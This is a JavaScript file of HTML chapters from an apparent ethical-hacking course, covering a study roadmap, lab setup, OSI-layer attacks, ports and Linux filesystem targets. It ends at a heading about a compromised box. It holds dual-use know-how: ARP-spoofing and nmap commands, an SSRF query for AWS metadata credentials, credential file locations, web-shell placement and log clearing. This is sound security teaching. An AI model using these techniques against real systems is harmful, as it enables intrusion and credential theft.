// ═══════════════════════════════════════════════════════════
// EthicalHack Academy — All Chapter Content
// 100% Legal, Educational Cybersecurity Curriculum
// ═══════════════════════════════════════════════════════════

const CHAPTERS = {

// ── CHAPTER 0: OVERVIEW ──────────────────────────────────
ch0: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 00</span>
    <span class="ch-phase" style="background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.3)">Course Overview</span>
  </div>
  <h2>Your Complete <span class="accent">Ethical Hacking</span> Roadmap</h2>
  <p class="chapter-intro">Before writing a single command, understand the full landscape. This chapter gives you the 6-month roadmap, your learning philosophy, lab setup, and the master framework that applies to every single topic in this course.</p>
</div>

<div class="section-label">The Master Learning Framework</div>
<div class="body-text">Your mentor taught you the most powerful learning technique in existence. Before touching any topic, answer these 5 questions. This framework turns passive reading into active, deep understanding.</div>

<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">The purpose and motivation. <strong>Why does this exist? Why should I care?</strong> Without WHY, knowledge is hollow.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">The internal mechanics. <strong>How does it actually work at the deepest level?</strong> Internals separate experts from users.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Real-world context. <strong>Where does this appear in production systems?</strong> Context makes knowledge applicable.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">Attack and defense scenarios. <strong>When do hackers use this? When do defenders care?</strong> Timing is everything.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Audience and relevance. <strong>Who needs this skill?</strong> Knowing your audience sharpens focus.</div></div>
</div>

<div class="section-label">The 6-Month Roadmap</div>

<div class="roadmap">
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.4);color:#00d4ff">1</div>
    <div class="rm-content">
      <div class="rm-week">WEEKS 1–4 · PHASE 1</div>
      <div class="rm-title">Foundations</div>
      <div class="rm-desc">Networking (OSI, TCP/IP), Linux command line, filesystem, permissions, Bash scripting, Python basics. Set up your Kali VM and home lab.</div>
      <div class="rm-tags"><span class="rm-tag">OSI Model</span><span class="rm-tag">TCP/IP</span><span class="rm-tag">Linux</span><span class="rm-tag">Bash</span><span class="rm-tag">Python</span><span class="rm-tag">Kali Linux</span></div>
      <div style="margin-top:10px;font-size:12px;color:#00ff88">🏁 Milestone: Root your first CTF box on TryHackMe · Complete Bandit levels 0–15</div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.4);color:#00ff88">2</div>
    <div class="rm-content">
      <div class="rm-week">WEEKS 5–8 · PHASE 2</div>
      <div class="rm-title">Networking &amp; Protocol Mastery</div>
      <div class="rm-desc">Wireshark packet analysis, Nmap scanning methodology, DNS, HTTP deep dive, firewalls, VPN concepts. Understand what flows through the wire.</div>
      <div class="rm-tags"><span class="rm-tag">Wireshark</span><span class="rm-tag">Nmap</span><span class="rm-tag">DNS</span><span class="rm-tag">HTTP</span><span class="rm-tag">Firewalls</span></div>
      <div style="margin-top:10px;font-size:12px;color:#00ff88">🏁 Milestone: Complete TryHackMe Pre-Security path · Capture and analyze real traffic</div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(255,140,0,0.1);border:1px solid rgba(255,140,0,0.4);color:#ff8c00">3</div>
    <div class="rm-content">
      <div class="rm-week">WEEKS 9–14 · PHASE 3</div>
      <div class="rm-title">Web Application Security</div>
      <div class="rm-desc">HTTP internals, OWASP Top 10, Burp Suite, SQL injection, XSS, IDOR, SSRF, authentication bypass, API security. Bug bounty ready.</div>
      <div class="rm-tags"><span class="rm-tag">Burp Suite</span><span class="rm-tag">OWASP Top 10</span><span class="rm-tag">SQLi</span><span class="rm-tag">XSS</span><span class="rm-tag">API Security</span></div>
      <div style="margin-top:10px;font-size:12px;color:#00ff88">🏁 Milestone: Complete PortSwigger Web Academy · Solve 10 web CTF challenges</div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(168,85,247,0.1);border:1px solid rgba(168,85,247,0.4);color:#a855f7">4</div>
    <div class="rm-content">
      <div class="rm-week">WEEKS 15–20 · PHASE 4</div>
      <div class="rm-title">Exploitation &amp; Penetration Testing</div>
      <div class="rm-desc">Full pentest methodology, OSINT &amp; recon, vulnerability scanning, Metasploit (lab only), privilege escalation, post-exploitation, pentest report writing.</div>
      <div class="rm-tags"><span class="rm-tag">Metasploit</span><span class="rm-tag">OSINT</span><span class="rm-tag">PrivEsc</span><span class="rm-tag">Reporting</span></div>
      <div style="margin-top:10px;font-size:12px;color:#00ff88">🏁 Milestone: Root 5 HTB machines · Write a professional pentest report</div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(255,68,85,0.1);border:1px solid rgba(255,68,85,0.4);color:#ff4455">5</div>
    <div class="rm-content">
      <div class="rm-week">WEEKS 21–22 · PHASE 5</div>
      <div class="rm-title">Specialisation</div>
      <div class="rm-desc">Cryptography, digital forensics, steganography, reverse engineering basics, CTF strategy, malware analysis in sandboxes.</div>
      <div class="rm-tags"><span class="rm-tag">Crypto</span><span class="rm-tag">Forensics</span><span class="rm-tag">CTF</span><span class="rm-tag">Reverse Engineering</span></div>
      <div style="margin-top:10px;font-size:12px;color:#00ff88">🏁 Milestone: Compete in a real CTF · Analyse a malware sample safely</div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(255,215,0,0.1);border:1px solid rgba(255,215,0,0.4);color:#ffd700">6</div>
    <div class="rm-content">
      <div class="rm-week">WEEKS 23–26 · PHASE 6</div>
      <div class="rm-title">Career Launch</div>
      <div class="rm-desc">Bug bounty methodology, HackerOne/Bugcrowd, portfolio building, interview prep, responsible disclosure, certification roadmap.</div>
      <div class="rm-tags"><span class="rm-tag">Bug Bounty</span><span class="rm-tag">HackerOne</span><span class="rm-tag">Portfolio</span><span class="rm-tag">Interviews</span></div>
      <div style="margin-top:10px;font-size:12px;color:#00ff88">🏁 Milestone: Submit 3 real bug reports · Apply for first security role</div>
    </div>
  </div>
</div>

<div class="section-label">Certification Track</div>
<div class="cert-path">
  <div class="cert-item"><div class="cert-badge" style="background:rgba(0,212,255,0.08);border-color:rgba(0,212,255,0.4);color:#00d4ff">CompTIA A+</div></div>
  <div class="cert-arrow">→</div>
  <div class="cert-item"><div class="cert-badge" style="background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.4);color:#00ff88">Network+</div></div>
  <div class="cert-arrow">→</div>
  <div class="cert-item"><div class="cert-badge" style="background:rgba(255,140,0,0.08);border-color:rgba(255,140,0,0.4);color:#ff8c00">Security+</div></div>
  <div class="cert-arrow">→</div>
  <div class="cert-item"><div class="cert-badge" style="background:rgba(168,85,247,0.08);border-color:rgba(168,85,247,0.4);color:#a855f7">eJPT / CEH</div></div>
  <div class="cert-arrow">→</div>
  <div class="cert-item"><div class="cert-badge" style="background:rgba(255,68,85,0.08);border-color:rgba(255,68,85,0.4);color:#ff4455">OSCP</div></div>
</div>

<div class="section-label">Lab Setup — First Priority</div>
<div class="cards-grid">
  <div class="card"><div class="card-accent" style="background:var(--accent)"></div><div class="card-icon">🖥️</div><div class="card-title">VirtualBox</div><div class="card-body">Free hypervisor. Download from virtualbox.org. Runs your Kali VM in isolation — never hack from your daily machine.</div><div class="card-tag" style="background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.3)">FREE</div></div>
  <div class="card"><div class="card-accent" style="background:var(--green)"></div><div class="card-icon">🐉</div><div class="card-title">Kali Linux</div><div class="card-body">Download the VirtualBox OVA from kali.org/get-kali. Pre-installed with 600+ security tools. Your primary attack machine.</div><div class="card-tag" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">FREE</div></div>
  <div class="card"><div class="card-accent" style="background:var(--orange)"></div><div class="card-icon">🎯</div><div class="card-title">TryHackMe</div><div class="card-body">Browser-based labs. No setup needed. Start with Pre-Security path. Free tier covers months of content.</div><div class="card-tag" style="background:rgba(255,140,0,0.1);color:#ff8c00;border:1px solid rgba(255,140,0,0.3)">FREE TIER</div></div>
  <div class="card"><div class="card-accent" style="background:var(--purple)"></div><div class="card-icon">📝</div><div class="card-title">Obsidian Notes</div><div class="card-body">Free note-taking app. Create folders: Concepts / Tools / CTF Writeups / Lab Notes / Cheatsheets / Bug Bounty. Write everything down.</div><div class="card-tag" style="background:rgba(168,85,247,0.1);color:#a855f7;border:1px solid rgba(168,85,247,0.3)">FREE</div></div>
</div>

<div class="section-label">The Golden Rules</div>
<div class="hack-box">
  <div class="hack-box-title">⚠️ Legal Boundary — Non-Negotiable</div>
  <div class="hack-box-body">
    <strong>Rule 1:</strong> Never attack systems you do not own or have explicit written permission to test. Unauthorised access is a criminal offence in every country.<br><br>
    <strong>Rule 2:</strong> Always work in controlled lab environments (VMs, TryHackMe, HTB) or against systems you own.<br><br>
    <strong>Rule 3:</strong> Document everything. A professional always has a paper trail of authorisation.<br><br>
    <strong>Rule 4:</strong> Responsible disclosure — if you find a vulnerability legitimately, report it to the vendor privately before going public.
  </div>
</div>
<div class="defense-box">
  <div class="defense-box-title">🛡️ The Hacker Mindset</div>
  <div class="defense-box-body">
    We learn how attackers think so defenders can win. Every offensive technique you learn has a defensive counterpart. Always ask both questions: <strong>"How would an attacker exploit this?"</strong> AND <strong>"How would a defender detect and prevent this?"</strong> The best security professionals think in both directions simultaneously.
  </div>
</div>`,

// ── CHAPTER 1: NETWORKING ────────────────────────────────
ch1: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 01</span>
    <span class="ch-phase" style="background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.3)">Phase 1 — Foundations</span>
  </div>
  <h2>Networking <span class="accent">Fundamentals</span></h2>
  <p class="chapter-intro">Every attack travels through a network. If you don't understand how data moves, you can't intercept it, manipulate it, or defend it. This is the single most important foundation in all of cybersecurity.</p>
</div>

<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text"><strong>96% of all attacks</strong> use the network as their delivery mechanism. Without networking knowledge you are blind.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Data travels in structured layers. Each layer adds a header, performs a specific job, and passes data to the next. This is <strong>encapsulation</strong>.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Every device connected to the internet. Every corporate LAN. Every cloud server. Every WiFi network you walk past.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">During reconnaissance (Nmap), during exploitation (sending payloads), during post-exploitation (pivoting), during forensics (packet analysis).</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Every pentester, network engineer, forensics analyst, sysadmin, and developer who touches a connected system.</div></div>
</div>

<div class="section-label">The OSI Model — All 7 Layers with Hacking Context</div>
<div class="body-text">The OSI model is a 7-layer framework describing how data travels from your keyboard to someone else's screen. Created in 1984 to ensure different networks could communicate. Each layer has a specific job — and a specific attack surface.</div>

<div class="osi-stack">
  <div class="osi-layer" style="background:rgba(168,85,247,0.08);border-color:rgba(168,85,247,0.2)" onclick="toggleOSI(this)">
    <div class="osi-num">7</div><div><div class="osi-name">Application</div><div class="osi-desc">HTTP, DNS, FTP, SMTP, SSH</div></div><div class="osi-hack">SQLi · XSS · OWASP Top 10</div><div style="font-size:11px;color:#666;text-align:right">Click to expand ↓</div>
  </div>
  <div class="osi-detail">
    <div class="body-text"><strong>What it does:</strong> The only layer users directly interact with. Protocols here define how applications communicate. HTTP asks for web pages. SMTP sends email. DNS translates domain names to IP addresses.</div>
    <div class="hack-box"><div class="hack-box-title">⚔️ Layer 7 Attacks</div><div class="hack-box-body">The <strong>entire OWASP Top 10 lives here</strong>. SQL injection manipulates database queries. XSS injects JavaScript. Broken authentication exploits weak login logic. SSRF makes the server fetch internal resources. <strong>Burp Suite</strong> intercepts and modifies HTTP at this layer in real time.</div></div>
    <div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — layer 7 commands</div></div><div class="code-body"><span class="cm"># DNS query (application layer)</span>
dig google.com A
nslookup tryhackme.com
<span class="cm"># HTTP request manually</span>
curl -v http://target/
curl -H "Host: internal.target" http://target/</div></div>
  </div>

  <div class="osi-layer" style="background:rgba(0,212,255,0.06);border-color:rgba(0,212,255,0.15)" onclick="toggleOSI(this)">
    <div class="osi-num">6</div><div><div class="osi-name">Presentation</div><div class="osi-desc">SSL/TLS, JPEG, ASCII, Unicode</div></div><div class="osi-hack">SSL stripping · weak ciphers</div><div style="font-size:11px;color:#666;text-align:right">Click to expand ↓</div>
  </div>
  <div class="osi-detail">
    <div class="body-text"><strong>What it does:</strong> Translates data formats, handles encryption/decryption (SSL/TLS), and compression. The padlock icon in your browser — that's Layer 6 working.</div>
    <div class="hack-box"><div class="hack-box-title">⚔️ Layer 6 Attacks</div><div class="hack-box-body">SSL stripping downgrades HTTPS to HTTP — traffic becomes readable. Weak cipher suites (RC4, DES) can be broken. POODLE, BEAST, CRIME attacks exploit TLS implementation flaws. <code>sslscan target:443</code> probes for weak ciphers.</div></div>
  </div>

  <div class="osi-layer" style="background:rgba(0,255,136,0.06);border-color:rgba(0,255,136,0.15)" onclick="toggleOSI(this)">
    <div class="osi-num">5</div><div><div class="osi-name">Session</div><div class="osi-desc">NetBIOS, RPC, session tokens</div></div><div class="osi-hack">Session hijacking · cookie theft</div><div style="font-size:11px;color:#666;text-align:right">Click to expand ↓</div>
  </div>
  <div class="osi-detail">
    <div class="body-text"><strong>What it does:</strong> Opens, manages, and closes "sessions" — conversations between applications. Think of it as the phone call setup: dialing, talking, hanging up. Keeps track of who is talking to whom.</div>
    <div class="hack-box"><div class="hack-box-title">⚔️ Layer 5 Attacks</div><div class="hack-box-body">Session hijacking: steal a user's session token (cookie) and impersonate them without knowing their password. If a cookie lacks <code>HttpOnly</code> and <code>Secure</code> flags, XSS can steal it via <code>document.cookie</code>.</div></div>
  </div>

  <div class="osi-layer" style="background:rgba(255,140,0,0.06);border-color:rgba(255,140,0,0.15)" onclick="toggleOSI(this)">
    <div class="osi-num">4</div><div><div class="osi-name">Transport</div><div class="osi-desc">TCP (reliable) · UDP (fast)</div></div><div class="osi-hack">Port scanning · SYN flood DoS</div><div style="font-size:11px;color:#666;text-align:right">Click to expand ↓</div>
  </div>
  <div class="osi-detail">
    <div class="body-text"><strong>TCP</strong> — Reliable, ordered, guaranteed delivery. Uses a 3-way handshake. Slower but trustworthy. Used by HTTP, SSH, email.<br><br><strong>UDP</strong> — Fast, no guarantee, no handshake. Used by DNS, video streaming, gaming, VoIP.</div>
    <div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">tcp handshake</div></div><div class="code-body">Client  →  SYN (seq=1000)            →  Server
Client  ←  SYN-ACK (seq=5000,ack=1001) ←  Server
Client  →  ACK (ack=5001)             →  Server
<span class="cm"># Connection ESTABLISHED — data flows</span>

<span class="cm"># SYN flood attack: send millions of SYN, never ACK</span>
<span class="cm"># Server fills up half-open connection table → DoS</span></div></div>
    <div class="hack-box"><div class="hack-box-title">⚔️ Layer 4 Attacks</div><div class="hack-box-body">Nmap port scanning discovers open TCP/UDP ports — each is a potential entry point. SYN flood sends millions of SYN packets exhausting server resources. Stealth scan (<code>nmap -sS</code>) sends SYN, reads SYN-ACK to confirm port open, then RST — never completing handshake. Many firewalls don't log incomplete connections.</div></div>
  </div>

  <div class="osi-layer" style="background:rgba(255,68,85,0.06);border-color:rgba(255,68,85,0.15)" onclick="toggleOSI(this)">
    <div class="osi-num">3</div><div><div class="osi-name">Network</div><div class="osi-desc">IPv4, IPv6, ICMP, routing</div></div><div class="osi-hack">IP spoofing · ICMP attacks · MITM</div><div style="font-size:11px;color:#666;text-align:right">Click to expand ↓</div>
  </div>
  <div class="osi-detail">
    <div class="body-text"><strong>What it does:</strong> Handles IP addresses and routing — the path data takes across the internet. Routers operate here, making hop-by-hop decisions. Every device has an IP address. CIDR notation (192.168.1.0/24) defines network ranges.</div>
    <div class="hack-box"><div class="hack-box-title">⚔️ Layer 3 Attacks</div><div class="hack-box-body">IP spoofing fakes source addresses. Traceroute maps every router hop revealing network topology. CIDR scanning: <code>nmap -sn 192.168.1.0/24</code> discovers all live hosts. AWS metadata SSRF: <code>169.254.169.254</code> — hitting this leaks cloud credentials.</div></div>
  </div>

  <div class="osi-layer" style="background:rgba(100,100,100,0.06);border-color:rgba(100,100,100,0.15)" onclick="toggleOSI(this)">
    <div class="osi-num">2</div><div><div class="osi-name">Data Link</div><div class="osi-desc">Ethernet, MAC addresses, switches</div></div><div class="osi-hack">ARP poisoning · MAC flooding</div><div style="font-size:11px;color:#666;text-align:right">Click to expand ↓</div>
  </div>
  <div class="osi-detail">
    <div class="body-text"><strong>What it does:</strong> Node-to-node delivery within the same LAN using MAC addresses (hardware addresses burned into NICs). Switches operate here. ARP maps IP addresses to MAC addresses.</div>
    <div class="hack-box"><div class="hack-box-title">⚔️ Layer 2 Attacks</div><div class="hack-box-body">ARP poisoning: broadcast fake ARP replies saying "I am the gateway" — all LAN traffic flows through you (MITM). Tool: <code>arpspoof -i eth0 -t victim_ip gateway_ip</code>. Enable IP forwarding so victim keeps connectivity while you intercept.</div></div>
  </div>

  <div class="osi-layer" style="background:rgba(50,50,50,0.3);border-color:rgba(80,80,80,0.3)" onclick="toggleOSI(this)">
    <div class="osi-num">1</div><div><div class="osi-name">Physical</div><div class="osi-desc">Cables, Wi-Fi, signals, hubs</div></div><div class="osi-hack">Rogue AP · USB attacks · wiretapping</div><div style="font-size:11px;color:#666;text-align:right">Click to expand ↓</div>
  </div>
  <div class="osi-detail">
    <div class="body-text"><strong>What it does:</strong> Actual hardware, signals, transmission media. Converts frames to raw bits: electrical signals (copper), light (fiber), radio waves (Wi-Fi). Physical security IS cybersecurity.</div>
    <div class="hack-box"><div class="hack-box-title">⚔️ Layer 1 Attacks</div><div class="hack-box-body">Rogue Wi-Fi access points broadcast on same frequency as legitimate AP. USB Rubber Ducky types malicious commands at 1000 keystrokes/second. Monitor mode: <code>airmon-ng start wlan0</code> captures all wireless frames in range. Cold boot attack extracts RAM contents (including encryption keys) seconds after power-off.</div></div>
  </div>
</div>

<div class="section-label">Essential Port Reference</div>
<div class="table-wrap">
<table>
<thead><tr><th>Port</th><th>Service</th><th>Protocol</th><th>Hacker Significance</th></tr></thead>
<tbody>
<tr><td><code>21</code></td><td><strong>FTP</strong></td><td>TCP</td><td>Plaintext credentials. Anonymous login misconfig. Banner reveals server version.</td></tr>
<tr><td><code>22</code></td><td><strong>SSH</strong></td><td>TCP</td><td>Brute-forceable. Key-based auth bypass if keys misconfigured. Tunneling for pivoting.</td></tr>
<tr><td><code>23</code></td><td><strong>Telnet</strong></td><td>TCP</td><td>Everything in plaintext — username, password, all commands. Never exposed legitimately.</td></tr>
<tr><td><code>53</code></td><td><strong>DNS</strong></td><td>UDP/TCP</td><td>Zone transfer (AXFR) leaks all records. DNS amplification DDoS. Cache poisoning.</td></tr>
<tr><td><code>80</code></td><td><strong>HTTP</strong></td><td>TCP</td><td>Full OWASP Top 10 applies. Nikto scans misconfigs. Burp intercepts all traffic.</td></tr>
<tr><td><code>443</code></td><td><strong>HTTPS</strong></td><td>TCP</td><td>Still vulnerable to app-layer attacks. TLS misconfig. Certificate issues.</td></tr>
<tr><td><code>445</code></td><td><strong>SMB</strong></td><td>TCP</td><td>EternalBlue (MS17-010) enabled WannaCry. Unauthenticated shares. Pass-the-hash.</td></tr>
<tr><td><code>3306</code></td><td><strong>MySQL</strong></td><td>TCP</td><td>Default root with blank password. Direct DB access if exposed externally.</td></tr>
<tr><td><code>3389</code></td><td><strong>RDP</strong></td><td>TCP</td><td>BlueKeep CVE. Brute-forceable. Credential theft via mimikatz post-exploitation.</td></tr>
</tbody>
</table>
</div>

<div class="section-label">Hands-On Lab</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — networking commands lab</div></div><div class="code-body"><span class="cm"># ── LAYER 7: DNS (Application)</span>
dig google.com A          <span class="cm"># A record = IPv4 address</span>
dig google.com MX         <span class="cm"># Mail server records</span>
nslookup tryhackme.com    <span class="cm"># Simple lookup</span>

<span class="cm"># ── LAYER 3: ICMP (Network)</span>
ping -c 4 8.8.8.8         <span class="cm"># Send 4 pings to Google DNS</span>
traceroute 8.8.8.8        <span class="cm"># Trace every hop to destination</span>

<span class="cm"># ── LAYER 4: TCP connections</span>
ss -tulpn                 <span class="cm"># All listening ports + processes</span>
netstat -an | grep ESTABLISHED

<span class="cm"># ── NMAP — legal target scanme.nmap.org</span>
nmap scanme.nmap.org              <span class="cm"># Top 1000 TCP ports</span>
nmap -sV scanme.nmap.org          <span class="cm"># Detect service versions</span>
nmap -A scanme.nmap.org           <span class="cm"># Aggressive: OS + versions + scripts</span>

<span class="cm"># ── MANUAL TCP CONNECTION (no tools needed)</span>
nc -v google.com 80               <span class="cm"># Connect to port 80</span>
<span class="cm"># Then type: GET / HTTP/1.0</span>
<span class="cm"># Press Enter twice — you made a raw HTTP request!</span></div></div>

<div class="section-label">Quiz — Chapter 1</div>
<div class="quiz-block">
  <div class="quiz-header"><div class="quiz-title">Networking Fundamentals Quiz</div><div class="quiz-count">6 questions</div></div>
  <div class="quiz-questions">
    <div class="quiz-q"><div class="quiz-q-num">Q1</div><div class="quiz-q-text">A packet travels from your browser to a web server. List the 4 headers added on the way down (Layer 7 to Layer 2) and what each contains.</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>Layer 7 (Application):</strong> HTTP request — method, headers, body. <strong>Layer 4 (Transport):</strong> TCP header — source port, destination port, sequence number, ACK number, flags. <strong>Layer 3 (Network):</strong> IP header — source IP, destination IP, TTL, protocol number. <strong>Layer 2 (Data Link):</strong> Ethernet frame — source MAC, destination MAC, EtherType, FCS checksum.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q2</div><div class="quiz-q-text">What is the difference between nmap -sS and nmap -sT? Why is -sS considered stealthier?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>-sT (TCP Connect):</strong> Completes the full 3-way handshake. The OS creates a real connection. Logged by most firewalls and IDS. <strong>-sS (SYN/Stealth):</strong> Sends SYN, receives SYN-ACK (confirming port is open), then sends RST without completing the handshake. Never creates a full connection. Many older firewalls only log completed connections, making -sS invisible to them. Requires root privileges because it crafts raw packets.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q3</div><div class="quiz-q-text">A ping response shows TTL=55. The target runs Linux (starts at TTL=64). How many router hops away is it?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">64 - 55 = <strong>9 hops</strong>. Each router decrements TTL by 1. This technique is called TTL fingerprinting and can also hint at the OS (Windows starts at 128, Linux at 64, some network devices at 255).</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q4</div><div class="quiz-q-text">An SSRF vulnerability lets you make the server fetch any URL. The server runs on AWS. What URL do you try and what are you hoping to get?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">URL: <strong>http://169.254.169.254/latest/meta-data/iam/security-credentials/</strong><br>This is the AWS Instance Metadata Service (IMDS). It returns IAM role credentials including AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY in plaintext. With these you can access the entire AWS account. This has produced some of the largest bug bounty payouts in history.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q5</div><div class="quiz-q-text">What is ARP poisoning and which OSI layer does it attack?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>Layer 2 (Data Link)</strong>. ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. ARP has no authentication — anyone can broadcast ARP replies. An attacker sends fake ARP replies saying "I am the gateway" to every device on the LAN. All devices update their ARP cache with the attacker's MAC as the gateway. All traffic flows through the attacker — a Man-in-the-Middle attack enabling eavesdropping, credential theft, and traffic injection.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q6</div><div class="quiz-q-text">You find port 445 open on a Windows server. What is your first instinct and what do you check for?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">Port 445 = <strong>SMB (Server Message Block)</strong>. First check: <code>nmap --script smb-vuln-ms17-010 -p 445 target</code> — this checks for EternalBlue (MS17-010), the vulnerability exploited by WannaCry ransomware. Also check: <code>smbclient -L //target</code> for unauthenticated share enumeration. If unauthenticated shares exist, you can read (and possibly write) files without credentials.</div></div>
  </div>
</div>`,

// ── CHAPTER 2: LINUX ─────────────────────────────────────
ch2: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 02</span>
    <span class="ch-phase" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">Phase 1 — Foundations</span>
  </div>
  <h2>Linux <span class="accent">for Hackers</span></h2>
  <p class="chapter-intro">96.3% of the world's servers run Linux. Every web server you'll ever attack, every cloud instance, every penetration testing tool — built for Linux first. This chapter takes you from ls/cd to thinking natively in Linux.</p>
</div>

<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text"><strong>96% of servers run Linux.</strong> Kali Linux is your attack platform. Every tool — Nmap, Metasploit, Burp, Wireshark — runs natively here.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Linux exposes everything through the filesystem. Processes, network connections, hardware — all accessible as <strong>files in /proc and /sys</strong>. No black boxes.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Web servers, cloud instances (AWS EC2, GCP, Azure), Android, IoT devices, routers, supercomputers, penetration testing distros.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">The moment you SSH into a compromised server. The moment you need to escalate privileges. Every CTF. Every pentest. Every bug bounty report.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Penetration testers, red teamers, bug bounty hunters, malware analysts, digital forensics investigators, CTF players, DevSecOps engineers.</div></div>
</div>

<div class="section-label">Linux Architecture — Kernel to Shell</div>
<div class="cards-grid">
  <div class="card"><div class="card-accent" style="background:#ff4455"></div><div class="card-icon">🔴</div><div class="card-title">Hardware (Ring 0 physical)</div><div class="card-body">CPU, RAM, disk, NIC. Knows nothing about files or users — just electrical signals. Physical access bypasses all software security.</div></div>
  <div class="card"><div class="card-accent" style="background:#ff8c00"></div><div class="card-icon">🧠</div><div class="card-title">Linux Kernel (Ring 0)</div><div class="card-body">The most privileged software on Earth. Manages processes, memory, devices, network stack, security enforcement. Kernel exploits = instant root (Dirty COW, Dirty Pipe).</div></div>
  <div class="card"><div class="card-accent" style="background:#ffd700"></div><div class="card-icon">🔌</div><div class="card-title">System Calls (syscalls)</div><div class="card-body">~400 formal requests from user programs to the kernel. open(), read(), write(), socket(), execve(). Every command you run is syscalls. <code>strace ls</code> reveals them all.</div></div>
  <div class="card"><div class="card-accent" style="background:#00ff88"></div><div class="card-icon">📚</div><div class="card-title">Standard Libraries (glibc)</div><div class="card-body">Wrappers around syscalls. printf() → write(). malloc() → mmap(). LD_PRELOAD hijacking overrides these for privilege escalation.</div></div>
  <div class="card"><div class="card-accent" style="background:#00d4ff"></div><div class="card-icon">💻</div><div class="card-title">Shell (bash, zsh)</div><div class="card-body">Command interpreter. Translates your commands into syscalls. Shell access = system access. Reverse shells give attackers a remote shell over TCP.</div></div>
  <div class="card"><div class="card-accent" style="background:#a855f7"></div><div class="card-icon">🖥️</div><div class="card-title">User Applications (Ring 3)</div><div class="card-body">Everything you run. Lowest privilege. Must ask kernel for everything. SUID binaries temporarily elevate from Ring 3 toward Ring 0 privileges.</div></div>
</div>

<div class="section-label">Critical Filesystem Directories</div>
<div class="table-wrap">
<table>
<thead><tr><th>Directory</th><th>Contents</th><th>Hacker Significance</th></tr></thead>
<tbody>
<tr><td><code>/etc</code></td><td>System configuration files</td><td><strong>CRITICAL:</strong> /etc/passwd (users), /etc/shadow (hashes), /etc/sudoers (sudo rules), /etc/crontab (scheduled tasks)</td></tr>
<tr><td><code>/home</code></td><td>User home directories</td><td>.bash_history (command history), .ssh/id_rsa (private keys), .aws/credentials (cloud keys), .env files</td></tr>
<tr><td><code>/root</code></td><td>Root user's home</td><td>Final destination of every privilege escalation. CTF flags live at /root/root.txt</td></tr>
<tr><td><code>/var/log</code></td><td>System logs</td><td>auth.log (SSH logins), apache2/access.log (web requests). Attackers clear these to cover tracks.</td></tr>
<tr><td><code>/var/www</code></td><td>Web server files</td><td>Write a PHP web shell here → command execution via browser</td></tr>
<tr><td><code>/proc</code></td><td>Virtual kernel filesystem</td><td>/proc/[PID]/environ (process env vars with secrets), /proc/version (kernel for exploits), /proc/net/tcp (connections)</td></tr>
<tr><td><code>/tmp</code></td><td>World-writable temp files</td><td>Every hacker's staging area. Download exploits, compile, execute here. Check noexec flag.</td></tr>
<tr><td><code>/bin /usr/bin</code></td><td>System binaries</td><td>SUID binaries here are prime targets. GTFOBins documents abuse of 60+ standard tools.</td></tr>
</tbody>
</table>
</div>

<div class="section-label">First 5 Minutes on a Compromised Box</div>
